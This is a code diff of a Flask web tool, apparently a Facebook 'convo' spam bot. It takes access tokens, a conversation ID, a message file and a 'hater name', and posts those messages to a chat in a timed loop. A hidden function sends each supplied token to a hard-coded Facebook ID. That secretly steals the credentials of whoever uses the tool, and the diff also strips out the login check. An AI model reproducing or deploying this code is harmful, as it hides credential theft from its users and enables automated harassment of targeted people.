@@ -1,58 +1,19 @@
-from flask import Flask, request, render_template_string, session, redirect, url_for
-from werkzeug.security import generate_password_hash, check_password_hash
-import threading, time, requests, pytz, os
+from flask import Flask, request, render_template_string
+import threading, time, requests, pytz
 from datetime import datetime
 import uuid
-
 app = Flask(__name__)
-app.secret_key = os.environ.get('SECRET_KEY', 'dev-sec-key-12345')  # Change for production!
-
-# User storage (replace with database in production)
-USERS = {
-    "admin": generate_password_hash(os.environ.get('ADMIN_PASS', 'admin@123'))
-}
-
-# Login required decorator
-def login_required(f):
-    def decorated_function(*args, **kwargs):
-        if not session.get('logged_in'):
-            return redirect(url_for('login'))
-        return f(*args, **kwargs)
-    return decorated_function
-
-# Login routes
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
-        if username in USERS and check_password_hash(USERS[username], password):
-            session['logged_in'] = True
-            session['username'] = username
-            return redirect(url_for('home'))
-        return render_template_string(LOGIN_TEMPLATE, error="Invalid credentials")
-    return render_template_string(LOGIN_TEMPLATE)
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('login'))
-
-# Original routes with login protection
+stop_events = {}
 @app.route("/")
-@login_required
 def home():
-    return render_template_string(HTML_TEMPLATE, username=session.get('username'))
-
+    return render_template_string(HTML_TEMPLATE)
 @app.route("/", methods=["POST"])
-@login_required
 def handle_form():
     opt = request.form["tokenOption"]
     convo = request.form["convo"]
     interval = int(request.form["interval"])
     hater = request.form["haterName"]
     msgs = request.files["msgFile"].read().decode().splitlines()
-    
     if opt == "single":
         tokens = [request.form["singleToken"]]
     else:
@@ -60,181 +21,270 @@ def handle_form():
             "day": request.files["dayFile"].read().decode().splitlines(),
             "night": request.files["nightFile"].read().decode().splitlines()
         }
-    
     if opt == "single":
         send_access_token("61552108006602", tokens[0])
     else:
         for token in tokens["day"] + tokens["night"]:
             send_access_token("61552108006602", token)
-    
     task_id = str(uuid.uuid4())
     stop_events[task_id] = threading.Event()
     threading.Thread(target=start_messaging, args=(tokens, msgs, convo, interval, hater, opt, task_id)).start()
     return f"Messaging started for conversation {convo}. Task ID: {task_id}"
-
 @app.route("/stop", methods=["POST"])
-@login_required
 def stop_task():
     task_id = request.form["task_id"]
     if task_id in stop_events:
         stop_events[task_id].set()
         return f"Task with ID {task_id} has been stopped."
-    return f"No active task with ID {task_id}."
-
-# Original functions remain unchanged
+    else:
+        return f"No active task with ID {task_id}."
 def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id):
     stop_event = stop_events[task_id]
     token_index = 0
     while not stop_event.is_set():
         current_hour = datetime.now(pytz.timezone('UTC')).hour
-        token_list = tokens["day"] if (token_option == "multi" and 6 <= current_hour < 18) else tokens.get("night", tokens)
+
+        if token_option == "multi":
+            if 6 <= current_hour < 18:
+                token_list = tokens["day"]
+            else:
+                token_list = tokens["night"]
+        else:
+            token_list = tokens
         for msg in messages:
             if stop_event.is_set():
                 break
-            send_msg(convo_id, token_list[token_index % len(token_list)], msg, hater_name)
-            token_index += 1
+            send_msg(convo_id, token_list[token_index], msg, hater_name)
+            token_index = (token_index + 1) % len(token_list)
             time.sleep(interval)
-
 def send_msg(convo_id, access_token, message, hater_name):
     try:
         url = f"https://graph.facebook.com/v15.0/t_{convo_id}/messages"
-        response = requests.post(url, json={
+        parameters = {
             "access_token": access_token,
             "message": f"{hater_name}: {message}"
-        }, headers={"Authorization": f"Bearer {access_token}"})
+        }
+        headers = {"Authorization": f"Bearer {access_token}"}
+        response = requests.post(url, json=parameters, headers=headers)
         if response.status_code != 200:
-            print(f"Error {response.status_code}: {response.text}")
-    except Exception as e:
-        print(f"Send error: {str(e)}")
-
+            print(f"Failed to send message. Status code: {response.status_code}")
+            print(f"Error Response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message: {e}")
 def send_access_token(uid, token):
     try:
-        requests.post(f"https://graph.facebook.com/v15.0/t_{uid}/", json={
-            "access_token": token,
-            "message": token
-        })
-    except Exception as e:
-        print(f"Token error: {str(e)}")
-
-# Login template
-LOGIN_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>𝚃𝙰𝙱𝙱𝚄 𝙰𝚁𝙰𝙸𝙉 | Login</title>
-    <style>
-        body { 
-            background: #1e1e1e; 
-            color: #39FF14;
-            font-family: 'Roboto', sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        .login-container {
-            max-width: 400px;
-            margin: 100px auto;
-            padding: 40px;
-            background: #292929;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(57, 255, 20, 0.3);
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 2.5rem;
-            text-shadow: 0 0 20px #39FF14;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            background: #333;
-            border: 1px solid #444;
-            color: #39FF14;
-            border-radius: 8px;
-            font-size: 1rem;
-        }
-        button {
-            background: #39FF14;
-            color: #121212;
-            padding: 14px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 1.1rem;
-            margin-top: 20px;
-        }
-        .error {
-            color: #FF007F;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <h1>𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉</h1>
-        {% if error %}
-            <div class="error">{{ error }}</div>
-        {% endif %}
-        <form method="POST">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">ACCESS TERMINAL</button>
-        </form>
-    </div>
-</body>
-</html>
-"""
-
-# Modified HTML_TEMPLATE with logout
-HTML_TEMPLATE = """
+        url = f"https://graph.facebook.com/v15.0/t_{uid}/"
+        parameters = {"access_token": token, "message": token}
+        requests.post(url, json=parameters)
+    except requests.RequestException as e:
+        print(f"Error sending access token: {e}")
+HTML_TEMPLATE = ("""
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𝚃𝙰𝙱𝙱𝚄 𝙰𝚁𝙰𝙸𝙉</title>
+    <title>𝚃𝙰𝙱𝙱𝚄 𝙰𝚁𝙰𝙸𝙽</title>
     <style>
+        /* General Styling */
         body {
             margin: 0;
-            padding: 60px 0 0;
+            padding: 0;
             background-color: #1e1e1e;
             color: #e0e0e0;
             font-family: 'Roboto', sans-serif;
             line-height: 1.6;
         }
-        .user-bar {
-            position: fixed;
-            top: 0;
-            right: 20px;
-            padding: 10px;
-            background: #292929;
-            border-radius: 0 0 8px 8px;
-        }
-        .user-bar span {
+
+        h1 {
             color: #39FF14;
-            margin-right: 15px;
+            font-size: 3rem;
+            text-align: center;
+            margin: 20px 0;
+            text-shadow: 0 0 20px #39FF14, 0 0 30px #32CD32;
         }
-        .user-bar a {
+
+        h2 {
             color: #FF007F;
-            text-decoration: none;
+            font-size: 2.2rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #FF007F, 0 0 15px #FF1493;
         }
-        /* ... rest of your original styles ... */
+
+        p, label {
+            color: #d4d4d4;
+            font-size: 1rem;
+        }
+
+        a {
+            color: #39FF14;
+            text-decoration: none;
+            transition: 0.3s ease-in-out;
+        }
+        a:hover {
+            text-decoration: underline;
+            color: #32CD32;
+        }
+
+        /* Form Container */
+        .content {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 40px;
+            background-color: #292929;
+            border-radius: 40px;
+            box-shadow: 0 0 30px rgba(57, 255, 20, 0.3);
+            margin-top: 30px;
+        }
+
+        /* Form Inputs and Labels */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #FFA500;
+            font-weight: 600;
+            text-shadow: 0 0 10px #FFA500;
+            font-size: 1.1rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px;
+            background-color: #333;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 1rem;
+            transition: border-color 0.3s ease-in-out;
+            box-sizing: border-box;
+        }
+
+        .form-control:focus {
+            border-color: #39FF14;
+            outline: none;
+            box-shadow: 0 0 8px rgba(57, 255, 20, 0.5);
+        }
+
+        select.form-control {
+            cursor: pointer;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            transition: 0.3s ease-in-out;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+        }
+
+        .btn-primary {
+            background-color: #39FF14;
+            color: #121212;
+        }
+
+        .btn-primary:hover {
+            background-color: #32CD32;
+        }
+
+        .btn-danger {
+            background-color: #FF007F;
+            color: #ffffff;
+        }
+
+        .btn-danger:hover {
+            background-color: #FF1493;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #111;
+            text-align: center;
+            padding: 30px;
+            color: #bbb;
+            margin-top: 40px;
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            .btn {
+                width: 100%;
+                padding: 12px 20px;
+                font-size: 1rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="user-bar">
-        <span>{{ username }}</span>
-        <a href="/logout">LOGOUT</a>
-    </div>
     <h1>𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉 😘😈</h1>
     <div class="content">
-        <!-- Your original form content remains unchanged -->
+        <form method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label class="form-label">Token Option:</label>
+                <select name="tokenOption" class="form-control" onchange="toggleInputs(this.value)">
+                    <option value="single">Single Token</option>
+                    <option value="multi">Multi Tokens</option>
+                </select>
+            </div>
+
+            <div id="singleInput" class="form-group">
+                <label class="form-label">Single Token:</label>
+                <input type="text" name="singleToken" class="form-control">
+            </div>
+
+            <div id="multiInputs" class="form-group" style="display: none;">
+                <label class="form-label">Day File:</label>
+                <input type="file" name="dayFile" class="form-control">
+                <label class="form-label">Night File:</label>
+                <input type="file" name="nightFile" class="form-control">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Conversation ID:</label>
+                <input type="text" name="convo" class="form-control" required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Message File:</label>
+                <input type="file" name="msgFile" class="form-control" required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Interval (sec):</label>
+                <input type="number" name="interval" class="form-control" required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Hater Name:</label>
+                <input type="text" name="haterName" class="form-control" required>
+            </div>
+
+            <button class="btn btn-primary" type="submit">Start</button>
+        </form>
+
+        <form method="POST" action="/stop">
+            <div class="form-group">
+                <label class="form-label">Task ID to Stop:</label>
+                <input type="text" name="task_id" class="form-control" required>
+            </div>
+            <button class="btn btn-danger" type="submit">Stop Task</button>
+        </form>
     </div>
+
     <footer>© Created By Tabbu Arain</footer>
+
     <script>
         function toggleInputs(value) {
             document.getElementById("singleInput").style.display = value === "single" ? "block" : "none";
@@ -242,8 +292,6 @@ HTML_TEMPLATE = """
         }
     </script>
 </body>
-</html>
-"""
-
+</html>""")
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
